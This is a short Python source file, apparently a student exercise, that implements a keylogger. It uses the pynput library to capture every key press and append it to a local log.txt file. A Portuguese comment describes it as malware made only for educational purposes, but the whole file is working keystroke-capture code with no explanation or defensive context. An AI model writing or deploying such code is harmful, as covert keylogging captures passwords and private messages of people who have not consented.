import os
from pynput.keyboard import Listener


# Malware desenvolvido apenas para fins educacionais


location = os.getcwd()
fileLocation = location + '\q1\log.txt'

def registerPressedKeys(key):
    keyPressed = str(key)

    with open(fileLocation, "a") as file:
        file.write(keyPressed)


with Listener(on_press=registerPressedKeys) as listener:
    listener.join()